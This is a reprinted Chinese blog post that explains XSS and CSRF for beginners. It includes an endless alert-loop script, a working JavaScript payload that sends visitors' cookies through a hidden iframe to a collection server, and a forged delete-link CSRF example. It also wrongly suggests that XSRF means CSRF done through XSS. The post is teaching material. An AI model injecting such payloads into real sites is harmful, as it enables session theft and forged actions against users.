---
title: '用大白话谈谈XSS与CSRF' 
date: 2019-02-02 2:30:11
hidden: true
slug: e9jrpjhbwdk
categories: [reprint]
---

{{< raw >}}

                    
<p>这两个关键词也是老生常谈了，但是还总是容易让人忘记与搞混~。<br>XSS与CSRF这两个关键词时常被拉出来一起比较（<strong>尤其是面试</strong>），我在这里也在写一篇扫盲文，也帮自己整理一下知识脉络。</p>
<p>这篇文章会用尽量“人话”的语言解释这二个关键词，让同学们对跨域，安全有更深一层次的了解。</p>
<p>国际惯例，先上一下维基百科：</p>
<p>XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。<strong>这类攻击通常包含了HTML以及用户端脚本语言</strong>。<br>I<br>CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上<strong>执行非本意的操作的攻击方法</strong>。</p>
<hr>
<p>维基的解释依旧高深莫测啊，我用 “人话”给大家解释一下吧。</p>
<p>XSS： 通过客户端脚本语言（最常见如：JavaScript）<br>在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！</p>
<p>CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</p>
<blockquote><p>很多同学会搞不明白XSS与CSRF的区别，虽然这两个关键词时常抱团出现，但他们两个是不同维度的东西（或者说他们的目的是不一样的）。<br> XSS更偏向于方法论，CSRF更偏向于一种形式，只要是伪造用户发起的请求，都可成为CSRF攻击。</p></blockquote>
<p>通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。<br> XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。</p>
<p>简单来说，条条大路（XSS路，命令行路）通罗马（CSRF马，XSRF马）。</p>
<p>前面讲了那么多理论介绍，那么我们来看一看实际代码吧。</p>
<p><strong> 【 Talk is cheap，Show me the code 】 </strong></p>
<p>场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了（各种姿势混着玩~）</p>
<p>如下：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="while(true){
    alert('你关不掉我');
}

" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xquery"><code><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>){
    alert(<span class="hljs-string">'你关不掉我'</span>);
}

</code></pre>
<p>这个就是最原始的脚本注入了。<br>用户进来就麻烦了，一直弹窗一直弹窗。</p>
<p>那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="
// 用 <script type=&quot;text/javascript&quot;></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement(&quot;iframe&quot;);
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = &quot;none&quot;;
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs typescript"><code>
<span class="hljs-comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span>
(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-built_in">window</span>, <span class="hljs-built_in">document</span></span>) </span>{
    <span class="hljs-comment">// 构造泄露信息用的 URL</span>
    <span class="hljs-keyword">var</span> cookies = <span class="hljs-built_in">document</span>.cookie;
    <span class="hljs-keyword">var</span> xssURIBase = <span class="hljs-string">"http://192.168.123.123/myxss/"</span>;
    <span class="hljs-keyword">var</span> xssURI = xssURIBase + <span class="hljs-built_in">window</span>.encodeURI(cookies);
    <span class="hljs-comment">// 建立隐藏 iframe 用于通讯</span>
    <span class="hljs-keyword">var</span> hideFrame = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"iframe"</span>);
    hideFrame.height = <span class="hljs-number">0</span>;
    hideFrame.width = <span class="hljs-number">0</span>;
    hideFrame.style.display = <span class="hljs-string">"none"</span>;
    hideFrame.src = xssURI;
    <span class="hljs-comment">// 开工</span>
    <span class="hljs-built_in">document</span>.body.appendChild(hideFrame);
})(<span class="hljs-built_in">window</span>, <span class="hljs-built_in">document</span>);
</code></pre>
<p>此段代码携带着cookie信息传输给了  <strong> <a href="http://192.168.123.123/myxss//strong" rel="nofollow noreferrer" target="_blank">http://192.168.123.123/myxss/...</a>  这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些可怕的代码，如把用户信息存进自己的数据库）。</strong></p>
<p><em>有没感觉到背后一寒</em></p>
<p>看到这里感觉到危险了吧（想想初学程序时我们的站点完全没有这个意识，活生生的是在裸奔），=<br>既然此段脚本注入能携带着用户信息到收集服务器，那么再研究研究，他自然能发邮件？发帖？一系列业务逻辑？  ~~当然可以！。</p>
<p>这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。</p>
<p>那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：<br>一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X" 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X" ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！</p>
<p>XSS与CSRF讲完了，回头我会讲下如何防范XSS与CSRF。</p>
<p><strong>今天国庆日，6天后国足将在西安迎战叙利亚，此战胜负十分关键！祝好运！国足队员加油！</strong></p>
<p>参考文章：<br><a href="https://segmentfault.com/a/1190000004623125">https://segmentfault.com/a/11...</a> 《 总结 XSS 与 CSRF 两种跨站攻击 》<br><a href="http://www.lxway.com/482281211.htm" rel="nofollow noreferrer" target="_blank">http://www.lxway.com/48228121...</a> 《CSRF CORS》</p>
<p>学习/（“抄”） 了不少文章（主要是demo代码不想重复写了），侵删。</p>

                
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
用大白话谈谈XSS与CSRF

## 原文链接
[https://segmentfault.com/a/1190000007059639](https://segmentfault.com/a/1190000007059639)

